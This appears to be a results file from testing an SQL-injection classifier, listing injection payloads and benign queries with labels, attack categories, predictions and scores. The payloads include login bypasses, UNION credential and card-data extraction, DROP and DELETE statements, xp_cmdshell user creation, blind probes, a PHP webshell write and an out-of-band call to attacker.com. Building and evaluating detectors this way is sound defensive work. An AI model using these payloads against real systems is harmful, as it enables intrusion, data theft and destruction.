query,label,category,description,predicted,correct,malicious_probability
1' OR '1'='1,1,tautology,Numeric prefix tautology,1,True,0.9999999995311772
admin'--,1,tautology,Username bypass,1,True,0.9999999595686903
admin' --,1,tautology,Username bypass with space,1,True,0.9999999455901755
admin'#,1,tautology,Username bypass hash,1,True,0.9999996805260113
' OR 1=1 OR ',1,tautology,Double OR tautology,1,True,0.9999999998661275
') OR ('1'='1,1,tautology,Parenthesis tautology,1,True,0.9999995577427139
') OR 1=1--,1,tautology,Parenthesis tautology comment,1,True,0.9999999999198628
' OR 1=1/*,1,tautology,Block comment,1,True,0.999999998223279
1 OR 1=1,1,tautology,Simple numeric OR,1,True,0.999999999829654
' OR 'a'='a,1,tautology,Letter tautology,1,True,0.9999999792293497
SELECT * FROM users WHERE id = 1 OR 1=1;,1,tautology_full,Full query with tautology,1,True,0.9999911490327117
SELECT * FROM users WHERE username = 'admin' OR '1'='1';,1,tautology_full,Full query string tautology,1,True,0.9999999733824696
SELECT * FROM users WHERE id = '' OR 1=1 -- '';,1,tautology_full,Empty string with tautology,1,True,0.9999998250305964
' UNION SELECT NULL--,1,union,Basic UNION probe,1,True,0.9999998348409405
"' UNION SELECT NULL,NULL--",1,union,Two column UNION,1,True,0.9999990735445
"' UNION SELECT NULL,NULL,NULL--",1,union,Three column UNION,1,True,0.9999939222905262
"' UNION SELECT 1,2,3--",1,union,Numeric UNION,1,True,0.9999996711463186
"' UNION SELECT 1,2,3,4,5--",1,union,Five column UNION,1,True,0.9999954416986939
"' UNION SELECT username,password FROM users--",1,union,Credential extraction,1,True,0.999985339467992
' UNION SELECT @@version--,1,union,Version extraction,1,True,0.9999982527444211
"' UNION ALL SELECT 1,2,3--",1,union,UNION ALL,1,True,0.9999928608893631
' UNION SELECT table_name FROM information_schema.tables--,1,union,Schema extraction,1,True,0.9998533121917441
' UNION SELECT column_name FROM information_schema.columns--,1,union,Column extraction,1,True,0.999869524401468
"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",1,union,Credential concat,1,True,0.9999908644650295
"' UNION SELECT 1,user(),database()--",1,union,Function extraction,1,True,0.999983990541862
1' UNION SELECT * FROM users--,1,union,Full table extraction,1,True,0.9999989844004795
"' UNION SELECT credit_card,cvv,expiry FROM payments--",1,union,Sensitive data extraction,1,True,0.9999276881841869
"SELECT * FROM users WHERE id = 1 UNION SELECT username,password,null FROM admins--",1,union_full,Full UNION injection,1,True,0.999992852523291
"SELECT * FROM products WHERE id = '' UNION SELECT 1,2,3,4,5--",1,union_full,Full UNION with columns,1,True,0.9999210923349273
'; DROP TABLE users--,1,stacked,Drop table,1,True,0.999994219976093
'; DROP TABLE orders--,1,stacked,Drop table,1,True,0.9999917309689498
'; DROP DATABASE production--,1,stacked,Drop database,1,True,0.999426269849893
'; DELETE FROM users--,1,stacked,Delete all users,1,True,0.9999285317418617
'; DELETE FROM users WHERE 1=1--,1,stacked,Delete with tautology,1,True,0.9999986049754092
'; TRUNCATE TABLE sessions--,1,stacked,Truncate table,1,True,0.9998737445928778
"'; INSERT INTO users VALUES('hacker','hacked@evil.com','admin')--",1,stacked,Insert admin,1,True,0.9999774015234068
'; UPDATE users SET password='hacked' WHERE username='admin'--,1,stacked,Update password,1,True,0.9999933327822296
'; UPDATE users SET role='admin' WHERE id=5--,1,stacked,Privilege escalation,1,True,0.9998755226716263
1; DROP TABLE products--,1,stacked,Numeric prefix drop,1,True,0.9999289440927921
'; EXEC xp_cmdshell('dir')--,1,stacked,Command execution,1,True,0.9998797033275911
'; EXEC xp_cmdshell('net user hacker password /add')--,1,stacked,Add user command,1,True,0.9998572026347944
'; SHUTDOWN--,1,stacked,Shutdown database,1,True,0.9999468078729868
'; ALTER TABLE users ADD hacked INT--,1,stacked,Alter table,1,True,0.9999520117520906
'; CREATE TABLE backdoor(cmd TEXT)--,1,stacked,Create backdoor table,1,True,0.9998976014168424
' AND SLEEP(5)--,1,time_blind,Time-based blind,1,True,0.999999098670535
' AND SLEEP(10)--,1,time_blind,Time-based blind 10s,1,True,0.999977412496931
1' AND SLEEP(5)--,1,time_blind,Numeric time blind,1,True,0.9999993205512645
' OR SLEEP(5)--,1,time_blind,OR time blind,1,True,0.9999987918196143
'; WAITFOR DELAY '0:0:5'--,1,time_blind,MSSQL waitfor,1,True,0.999818012143657
'; WAITFOR DELAY '0:0:10'--,1,time_blind,MSSQL waitfor 10s,1,True,0.9997907861339035
"' AND BENCHMARK(10000000,SHA1('test'))--",1,time_blind,MySQL benchmark,1,True,0.9994285243089293
' AND (SELECT SLEEP(5))--,1,time_blind,Subquery sleep,1,True,0.9999890949483733
"1' AND IF(1=1,SLEEP(5),0)--",1,time_blind,Conditional sleep,1,True,0.9999780366977451
"' OR IF(1=1,SLEEP(5),0)--",1,time_blind,OR conditional sleep,1,True,0.9999843130495327
' AND pg_sleep(5)--,1,time_blind,PostgreSQL sleep,1,True,0.9999338625702704
'; SELECT pg_sleep(5)--,1,time_blind,PostgreSQL sleep stacked,1,True,0.9999622298802412
' AND 1=1--,1,boolean_blind,Boolean true,1,True,0.9999999979993839
' AND 1=2--,1,boolean_blind,Boolean false,1,True,0.9999955953121209
' AND 'a'='a'--,1,boolean_blind,String boolean true,1,True,0.9999987803250648
' AND 'a'='b'--,1,boolean_blind,String boolean false,1,True,0.9999966310294115
"' AND SUBSTRING(@@version,1,1)='5'--",1,boolean_blind,Version probe,1,True,0.9998925039834152
"' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",1,boolean_blind,ASCII extraction,1,True,0.9995968508012179
' AND (SELECT COUNT(*) FROM users)>0--,1,boolean_blind,Count probe,1,True,0.9998525139716349
' AND LENGTH(database())>5--,1,boolean_blind,Database length probe,1,True,0.9996941345452041
"' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",1,boolean_blind,Password extraction,1,True,0.9996015324908287
1' AND 1=1 AND '1'='1,1,boolean_blind,Nested boolean,1,True,0.9999999905378868
' AND EXISTS(SELECT * FROM users)--,1,boolean_blind,EXISTS probe,1,True,0.9998587097979936
' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--,1,boolean_blind,Password char probe,1,True,0.9999961633313593
"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",1,error_based,ExtractValue,1,True,0.9999278048046744
"' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",1,error_based,UpdateXML,1,True,0.9999035486488766
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Double query,1,True,0.9998958041431425
"' AND GTID_SUBSET(@@version,1)--",1,error_based,GTID subset,1,True,0.9996791886285638
' AND EXP(~(SELECT * FROM (SELECT @@version)a))--,1,error_based,Exp overflow,1,True,0.9999747366836589
' ORDER BY 1--,1,error_based,Order by probe,1,True,0.9999907130989546
' ORDER BY 10--,1,error_based,Order by column count,1,True,0.9999389671439131
' ORDER BY 100--,1,error_based,Order by overflow,1,True,0.9999584559855584
' HAVING 1=1--,1,error_based,Having clause,1,True,0.9999983891645812
' GROUP BY columnname HAVING 1=1--,1,error_based,Group by having,1,True,0.9999323912911026
' oR '1'='1,1,obfuscated_case,Mixed case OR,1,True,0.9999994769797413
' Or 1=1--,1,obfuscated_case,Mixed case Or,1,True,0.9999986028445875
' uNiOn SeLeCt NuLl--,1,obfuscated_case,Mixed case UNION SELECT,1,True,0.9992576708079901
"' UnIoN sElEcT 1,2,3--",1,obfuscated_case,Alternating case,1,True,0.9996697032867611
' aNd SlEeP(5)--,1,obfuscated_case,Mixed case AND SLEEP,1,True,0.9998184855737823
'; dRoP tAbLe UsErS--,1,obfuscated_case,Mixed case DROP TABLE,1,True,0.999563730110189
'  OR   '1'='1,1,obfuscated_whitespace,Extra spaces,1,True,0.999999999749658
'	OR	1=1--,1,obfuscated_whitespace,Tab characters,1,True,0.9999999895316097
' \t OR \t 1=1--,1,obfuscated_whitespace,Mixed whitespace,1,True,0.9999999985081112
'  UNION  SELECT  NULL--,1,obfuscated_whitespace,Spaced UNION,1,True,0.9999998348409405
"'		UNION		SELECT		1,2,3--",1,obfuscated_whitespace,Tab UNION,1,True,0.9999996711463186
'/**/OR/**/1=1--,1,obfuscated_comment,Inline comment OR,1,True,0.9999997271263682
'/*x*/OR/*y*/'1'='1,1,obfuscated_comment,Named comments,1,True,0.9999803961751923
' /*!OR*/ 1=1--,1,obfuscated_comment,MySQL version comment,1,True,0.9999910374963205
'/**/UNION/**/SELECT/**/NULL--,1,obfuscated_comment,Comment UNION,1,True,0.999989941571196
"'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",1,obfuscated_comment,Multi comment,1,True,0.9995998746676926
' /*!50000OR*/ 1=1--,1,obfuscated_comment,Version conditional,1,True,0.9999677105899462
admin'/**/--,1,obfuscated_comment,Comment bypass,1,True,0.9999998003570775
' OR 'a'||'b'='ab,1,obfuscated_concat,Concat Oracle,1,True,0.9999999489892594
"' OR CONCAT('1','1')='11",1,obfuscated_concat,MySQL concat,1,True,0.9999979862837381
' OR CHR(49)||CHR(61)||CHR(49)--,1,obfuscated_concat,Chr concat,1,True,0.998471638434485
' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,1,obfuscated_concat,CHAR concat,1,True,0.9991116114078223
' OR 0x31=0x31--,1,obfuscated_encoded,Hex encoded,1,True,0.9999599609644804
' UNION SELECT 0x61646d696e--,1,obfuscated_encoded,Hex string,1,True,0.9999969263030312
' %4fR 1=1--,1,obfuscated_encoded,URL encoded O,1,True,0.9999999828057101
' OR%201=1--,1,obfuscated_encoded,URL encoded space,1,True,0.9999843051427358
'%27 OR 1=1--,1,obfuscated_encoded,URL encoded quote,1,True,0.9999999938171222
' %55NION %53ELECT NULL--,1,obfuscated_encoded,URL encoded keywords,1,True,0.9999615807800276
admin%27--,1,obfuscated_encoded,URL encoded username,1,True,0.9999974083162726
SELECT * FROM users WHERE id = '1' OR '1'='1',1,full_injection_select,Full SELECT injection,1,True,0.9999998312863212
SELECT * FROM users WHERE username = '' OR 1=1--',1,full_injection_select,Full username bypass,1,True,0.9999997627666056
"SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5--",1,full_injection_select,Full UNION attack,1,True,0.9998381101758399
SELECT * FROM users WHERE email = 'test@x.com' AND SLEEP(5)--',1,full_injection_select,Full time attack,1,True,0.9999811641612255
SELECT * FROM orders WHERE id = 1; DROP TABLE orders;--,1,full_injection_select,Full stacked attack,1,True,0.9994832438881965
INSERT INTO users (name) VALUES ('test' OR '1'='1');,1,full_injection_insert,Insert injection,1,True,0.9999923201913312
INSERT INTO logs (data) VALUES (''; DROP TABLE logs;--');,1,full_injection_insert,Insert stacked,1,True,0.9999111873521325
UPDATE users SET name = '' OR '1'='1' WHERE id = 1;,1,full_injection_update,Update injection,1,True,0.999976976023758
UPDATE products SET price = 0 WHERE id = 1 OR 1=1;,1,full_injection_update,Update tautology,1,True,0.9929560038682503
DELETE FROM users WHERE id = 1 OR 1=1;,1,full_injection_delete,Delete tautology,1,True,0.9999911904149563
DELETE FROM sessions WHERE id = '' OR '1'='1';,1,full_injection_delete,Delete injection,1,True,0.9999991700805073
' UNION SELECT load_file('/etc/passwd')--,1,advanced,File read,1,True,0.9999960832401924
' UNION SELECT * INTO OUTFILE '/tmp/hack.txt'--,1,advanced,File write,1,True,0.9999968259244916
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE hack--,1,advanced,Load file,1,True,0.9999016018078349
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--,1,advanced,Webshell upload,1,True,0.999980842879329
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,advanced,Nested sleep,1,True,0.9999667130408998
"' AND (SELECT count(*) FROM generate_series(1,10000000))--",1,advanced,PostgreSQL DoS,1,True,0.9989083191552227
"' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",1,advanced,Complex error based,1,True,0.9999442503468697
'; DECLARE @q VARCHAR(8000);SET @q='\\\\attacker.com\\share';EXEC master..xp_dirtree @q--,1,advanced,MSSQL out-of-band,1,True,0.998080264167051
"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY X)y)--",1,advanced,Double query complex,1,True,0.9999306518200116
' AND LOAD_EXTENSION('/path/to/evil.so')--,1,advanced,Extension loading,1,True,0.999337751000034
SELECT * FROM users WHERE user_id = $user_input;,0,placeholder,Application placeholder,1,False,0.6498707571035587
SELECT * FROM products WHERE category = ?;,0,placeholder,Prepared statement marker,0,True,0.30516129421473026
SELECT * FROM orders WHERE id = :order_id;,0,placeholder,Named parameter,0,True,0.40112400699853945
SELECT * FROM users WHERE created_at >= CURRENT_DATE - INTERVAL 30 DAY;,0,complex_benign,Interval calculation,1,False,0.7982016131934146
SELECT * FROM products WHERE price * 1.1 < 100;,0,complex_benign,Expression in WHERE,0,True,0.4540708428211157
"SELECT COALESCE(nickname, username, 'Anonymous') FROM users;",0,complex_benign,COALESCE function,1,False,0.9505516630607568
SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users;,0,complex_benign,CASE expression,1,False,0.9131710155482533
SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+@';,0,complex_benign,REGEXP pattern,1,False,0.9216008781525579
"SELECT GREATEST(price, min_price) FROM products;",0,complex_benign,GREATEST function,1,False,0.6550365749223864
"SELECT * FROM products WHERE MATCH(name, description) AGAINST('laptop');",0,complex_benign,Full text search,1,False,0.5958839615322093
WITH cte AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM cte;,0,complex_benign,CTE query,1,False,0.9066788723684255
SELECT * FROM users u WHERE u.id = ANY(SELECT user_id FROM orders);,0,complex_benign,ANY subquery,1,False,0.8422221553016442
SELECT * FROM products FOR UPDATE;,0,complex_benign,SELECT FOR UPDATE,1,False,0.9185742914448595
"SELECT GET_LOCK('my_lock', 10);",0,complex_benign,Get lock function,1,False,0.8800950351108134
EXPLAIN SELECT * FROM users WHERE id = 1;,0,complex_benign,EXPLAIN query,1,False,0.9791532677658904
SHOW TABLES;,0,complex_benign,Show tables,1,False,0.9992022892078027
DESCRIBE users;,0,complex_benign,Describe table,1,False,0.7815544768620811
SHOW CREATE TABLE users;,0,complex_benign,Show create,1,False,0.9983670312481431
SELECT * FROM inventory;,0,simple_select,Basic table scan,1,False,0.9404316679177723
SELECT * FROM payments;,0,simple_select,Basic table scan,1,False,0.9702350442876069
SELECT * FROM reviews;,0,simple_select,Basic table scan,1,False,0.8386039468392708
SELECT * FROM categories;,0,simple_select,Basic table scan,1,False,0.8926143850142672
SELECT * FROM shipping;,0,simple_select,Basic table scan,1,False,0.9003205401566131
SELECT * FROM addresses;,0,simple_select,Basic table scan,1,False,0.9282053510497609
SELECT * FROM coupons;,0,simple_select,Basic table scan,1,False,0.8605965201963596
SELECT * FROM wishlist;,0,simple_select,Basic table scan,1,False,0.8587825996761936
SELECT * FROM cart;,0,simple_select,Basic table scan,1,False,0.9192784505319213
SELECT * FROM notifications;,0,simple_select,Basic table scan,1,False,0.7114632047320019
SELECT id FROM users;,0,simple_select,Single column,1,False,0.9219725113262851
SELECT email FROM users;,0,simple_select,Single column,1,False,0.7505796271923859
"SELECT name, price, stock FROM products;",0,simple_select,Multiple columns,0,True,0.25919796903537523
"SELECT first_name, last_name, email, phone FROM customers;",0,simple_select,Customer columns,0,True,0.3200114814150988
"SELECT order_id, total, created_at FROM orders WHERE user_id = 5;",0,simple_where,User orders,0,True,0.028660290879632573
SELECT * FROM products WHERE stock > 0;,0,simple_where,In stock products,0,True,0.4915007709546976
SELECT * FROM users WHERE last_login IS NOT NULL;,0,simple_where,Active users,1,False,0.9843518995096557
SELECT * FROM orders WHERE shipped_at IS NULL;,0,simple_where,Pending orders,1,False,0.849111719309612
SELECT * FROM products WHERE name = 'MacBook Pro';,0,simple_where,Product by name,1,False,0.5601506270885868
SELECT * FROM users WHERE phone = '+1-555-123-4567';,0,simple_where,Phone lookup,1,False,0.8511058223767357
SELECT * FROM products WHERE sku = 'ABC-12345';,0,simple_where,SKU lookup,1,False,0.6465286271519249
SELECT * FROM orders WHERE tracking_number = 'TRK123456789';,0,simple_where,Tracking lookup,1,False,0.7960671580353813
SELECT COUNT(DISTINCT category_id) FROM products;,0,aggregate,Distinct count,1,False,0.7008963251963822
SELECT SUM(quantity * price) FROM order_items WHERE order_id = 100;,0,aggregate,Order total,0,True,0.11375434081831594
"SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = 50;",0,aggregate,Product rating,0,True,0.27931913350956683
"SELECT MAX(total), MIN(total) FROM orders;",0,aggregate,Order range,1,False,0.6151876938272941
"SELECT COUNT(*) FROM users WHERE created_at > DATE_SUB(NOW(), INTERVAL 7 DAY);",0,aggregate,Recent users,1,False,0.8664741482174753
SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,0,order_limit,Newest products,0,True,0.43898979398561633
SELECT * FROM orders ORDER BY total DESC LIMIT 5;,0,order_limit,Top orders,1,False,0.6857373000247625
SELECT * FROM users ORDER BY last_login DESC LIMIT 100;,0,order_limit,Recent logins,1,False,0.8868082490482588
SELECT * FROM products ORDER BY stock ASC LIMIT 20;,0,order_limit,Low stock,1,False,0.5851671071702245
SELECT * FROM products LIMIT 50 OFFSET 100;,0,pagination,Pagination query,1,False,0.7765002471426513
SELECT * FROM users LIMIT 25 OFFSET 75;,0,pagination,Pagination query,1,False,0.9272619973974574
SELECT * FROM orders LIMIT 10 OFFSET 0;,0,pagination,First page,1,False,0.8925098101260264
SELECT DISTINCT brand FROM products;,0,distinct,Distinct brands,0,True,0.49754950260344266
"SELECT DISTINCT city, country FROM addresses;",0,distinct,Distinct locations,1,False,0.599402583646678
SELECT DISTINCT payment_method FROM payments;,0,distinct,Payment methods,1,False,0.8436084347036219
SELECT * FROM orders WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';,0,date_compare,Month range,1,False,0.5306378305949355
SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1999-12-31';,0,date_compare,Birth year range,1,False,0.9867786409506312
SELECT * FROM sessions WHERE expires_at > NOW();,0,date_compare,Valid sessions,1,False,0.5835615167296264
SELECT * FROM coupons WHERE valid_until >= CURDATE();,0,date_compare,Active coupons,1,False,0.5408527367628782
SELECT * FROM products WHERE price >= 10 AND price <= 50;,0,numeric_compare,Price range,0,True,0.475645085832859
SELECT * FROM orders WHERE item_count > 5;,0,numeric_compare,Large orders,0,True,0.420930798410823
SELECT * FROM users WHERE login_count >= 100;,0,numeric_compare,Power users,1,False,0.5884140527912289
SELECT * FROM products WHERE rating >= 4.5;,0,numeric_compare,Top rated,0,True,0.44280969827361
"SELECT * FROM products WHERE category_id NOT IN (1, 2, 3);",0,in_clause,NOT IN,0,True,0.36754667949885517
"SELECT * FROM users WHERE role IN ('admin', 'moderator', 'editor');",0,in_clause,Role check,1,False,0.998667558092961
"SELECT * FROM orders WHERE payment_status IN ('completed', 'refunded');",0,in_clause,Payment status,1,False,0.6015294312421138
"SELECT * FROM products WHERE color IN ('red', 'blue', 'green', 'black', 'white');",0,in_clause,Color filter,1,False,0.5191078774080248
SELECT * FROM users WHERE middle_name IS NULL;,0,null_check,Null middle name,1,False,0.9895454546806525
SELECT * FROM products WHERE discount_price IS NOT NULL;,0,null_check,Has discount,1,False,0.8504458878311663
SELECT * FROM orders WHERE cancelled_at IS NOT NULL;,0,null_check,Cancelled orders,1,False,0.9106995704709148
SELECT * FROM users WHERE status = 'active' AND email_verified = 1 AND phone_verified = 1;,0,multi_condition,Triple AND,1,False,0.7101470231929911
SELECT * FROM products WHERE (category_id = 5 OR category_id = 6) AND is_active = 1;,0,multi_condition,Mixed conditions,0,True,0.4513528380195432
SELECT * FROM orders WHERE status != 'cancelled' AND total > 100;,0,multi_condition,Not cancelled,1,False,0.7712920832382868
